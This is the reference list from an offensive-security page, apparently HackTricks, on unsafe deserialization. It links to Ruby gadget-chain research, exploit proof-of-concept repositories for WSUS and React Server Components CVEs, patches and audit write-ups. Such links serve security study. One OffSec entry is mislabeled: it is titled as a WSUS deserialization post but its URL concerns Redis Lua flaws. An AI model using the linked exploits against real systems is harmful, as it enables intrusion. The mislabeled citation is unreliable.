- GitHub Security Lab – Ruby unsafe deserialization (query help): https://codeql.github.com/codeql-query-help/ruby/rb-unsafe-deserialization/
- GitHub Security Lab – PoCs repo: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization
- Doyensec PR – Ruby 3.4 gadget: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/pull/1
- Luke Jahnke – Ruby 3.4 universal chain: https://nastystereo.com/security/ruby-3.4-deserialization.html
- Luke Jahnke – Gem::SafeMarshal escape: https://nastystereo.com/security/ruby-safe-marshal-escape.html
- Ruby 3.4.0-rc1 release: https://github.com/ruby/ruby/releases/tag/v3_4_0_rc1
- Ruby fix PR #12444: https://github.com/ruby/ruby/pull/12444
- Trail of Bits – Auditing RubyGems.org (Marshal findings): https://blog.trailofbits.com/2024/12/11/auditing-the-ruby-ecosystems-central-package-repository/
- watchTowr Labs – Is This Bad? This Feels Bad — GoAnywhere CVE-2025-10035: https://labs.watchtowr.com/is-this-bad-this-feels-bad-goanywhere-cve-2025-10035/
- [OffSec – CVE-2025-59287 WSUS unsafe deserialization (blog)](https://www.offsec.com/blog/recent-vulnerabilities-in-redis-servers-lua-scripting-engine-2/)
- [PoC – tecxx/CVE-2025-59287-WSUS](https://github.com/tecxx/CVE-2025-59287-WSUS)
- [RSC Report Lab – CVE-2025-55182 (React 19.2.0)](https://github.com/ghe770mvp/RSC_Vuln_Lab)

{{#include ../../banners/hacktricks-training.md}}
